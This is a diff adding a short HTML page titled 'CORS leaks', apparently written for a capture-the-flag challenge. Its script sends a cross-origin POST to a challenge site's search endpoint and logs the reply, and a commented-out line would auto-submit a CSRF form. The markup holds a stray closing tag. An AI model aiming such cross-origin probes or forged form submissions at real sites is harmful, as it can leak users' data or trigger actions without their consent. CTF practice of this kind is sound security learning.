@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS leaks</title>
+</head>
+<body>
+    <script>
+
+        fetch('https://chessbased.chall.lac.tf/search', {
+            method: 'POST',
+            headers: {
+            'Content-Type': 'application/json',
+            'Referrer': 'https://chessbased.chall.lac.tf/' // You can set the referrer here
+            },
+            body: JSON.stringify({
+                q: 'e4',
+            }),
+            mode: 'cors'     
+        }).then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error:', error))
+    </script>
+
+    <!-- CSRF -->
+
+
+    <!-- <script>document.getElementById("CSRForm").submit()</script> -->
+</script>
+      
+</body>
+</html>
